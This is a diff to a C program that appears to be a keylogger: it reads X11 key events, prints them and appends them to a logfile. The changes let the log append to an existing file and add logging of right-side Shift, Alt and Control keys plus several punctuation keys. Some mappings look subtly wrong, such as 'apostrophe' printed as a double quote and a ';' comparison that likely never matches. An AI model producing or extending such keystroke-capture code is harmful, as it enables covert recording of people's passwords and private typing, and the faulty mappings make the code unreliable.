@@ -133,7 +133,7 @@ int main(int argc, char * argv[]) {
         group = state.group;
     }
 
-    if ( (logfileStream = fopen (logfilePath, "ax")) == NULL){
+    if ( (logfileStream = fopen (logfilePath, "a")) == NULL){
         fprintf(stderr, "Cannot open logfile '%s'\n", logfilePath);
         exit(7);
     }
@@ -184,7 +184,19 @@ int main(int argc, char * argv[]) {
                     else if (strcmp(str,"Return") == 0)    printf("<Return>\n");
                     else if (strcmp(str,"BackSpace") == 0) printf("\b");
                     else if (strcmp(str,"Shift_L") == 0)   printf("<Shift_L>");
+                    else if (strcmp(str,"Shift_R") == 0)   printf("<Shift_R>");
                     else if (strcmp(str,"Alt_L") == 0)     printf("<Alt_L>");
+                    else if (strcmp(str,"Alt_R") == 0)     printf("<Alt_R>");
+                    else if (strcmp(str,"Control_L") == 0) printf("<Control_L>");
+                    else if (strcmp(str,"Control_R") == 0) printf("<Control_R>");
+                    else if (strcmp(str,"apostrophe") == 0) printf("\"");
+                    else if (strcmp(str,"slash") == 0)     printf("/");
+                    else if (strcmp(str,"equal") == 0)     printf("=");
+                    else if (strcmp(str,"minus") == 0)     printf("-");
+                    else if (strcmp(str,";") == 0)         printf(";");
+                    else if (strcmp(str,"period") == 0)    printf(".");
+                    else if (strcmp(str,"periodcentered") == 0) printf(".");
+                    else if (strcmp(str,"comma") == 0)     printf(",");
                     else printf("%s", str);
                     fflush(stdout);
 
@@ -199,7 +211,19 @@ int main(int argc, char * argv[]) {
                     else if (strcmp(str,"Return") == 0)    fprintf(logfileStream, "<Return>\n");
                     else if (strcmp(str,"BackSpace") == 0) fprintf(logfileStream, "\b");
                     else if (strcmp(str,"Shift_L") == 0)   fprintf(logfileStream, "<Shift_L>");
+                    else if (strcmp(str,"Shift_R") == 0)   fprintf(logfileStream, "<Shift_R>");
                     else if (strcmp(str,"Alt_L") == 0)     fprintf(logfileStream, "<Alt_L>");
+                    else if (strcmp(str,"Alt_R") == 0)     fprintf(logfileStream, "<Alt_R>");
+                    else if (strcmp(str,"Control_L") == 0) fprintf(logfileStream, "<Control_L>");
+                    else if (strcmp(str,"Control_R") == 0) fprintf(logfileStream, "<Control_R>");
+                    else if (strcmp(str,"apostrophe") == 0)fprintf(logfileStream, "\"");
+                    else if (strcmp(str,"slash") == 0)     fprintf(logfileStream, "/");
+                    else if (strcmp(str,"equal") == 0)     fprintf(logfileStream, "=");
+                    else if (strcmp(str,"minus") == 0)     fprintf(logfileStream, "-");
+                    else if (strcmp(str,";") == 0)         fprintf(logfileStream, ";");
+                    else if (strcmp(str,"period") == 0)    fprintf(logfileStream, ".");
+                    else if (strcmp(str,"periodcentered") == 0) fprintf(logfileStream, ".");
+                    else if (strcmp(str,"comma") == 0)     fprintf(logfileStream, ",");
                     else fprintf(logfileStream, "%s", str);
                     fflush(logfileStream);
                 }
